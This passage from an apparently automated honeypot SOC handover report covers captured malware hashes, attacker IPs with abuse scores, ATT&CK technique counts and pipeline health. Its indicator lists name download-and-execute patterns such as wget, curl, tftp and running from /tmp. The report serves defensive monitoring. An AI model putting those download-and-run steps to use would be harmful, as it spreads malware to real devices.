| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 6 |
| `80.233.12[.]109` | IE | Three Ireland (Hutchison) limited | **100** ⚠️ | 50 |
| `103.120.116[.]162` | PK | Broadband Business Ideas (PVT.) Limited | **100** ⚠️ | 50 |
| `78.66.45[.]101` | SE | Telia Network Services | **100** ⚠️ | 50 |
| `66.132.172[.]190` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `14.103.114[.]244` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `103.203.57[.]11` | US | Beijing Tiantexin Tech. Co., Ltd. | **100** ⚠️ | 50 |
| `45.182.192[.]221` | BR | VCONNECT TELECOM LTDA ME | **100** ⚠️ | 4 |
| `66.132.172[.]204` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `194.195.210[.]47` | US | Linode, LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 97 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 75 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 24 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 24 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 23 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 8 |
| AbuseIPDB score 15 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 3533 cases |
| Tool 34  | Credential Extractor        | ✅ 92 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 79 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (0.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 63 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 75 priority case(s) shown individually · 30 recon entry/entries in table (12 group(s) consolidating 3415 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-15T06:43:50Z_
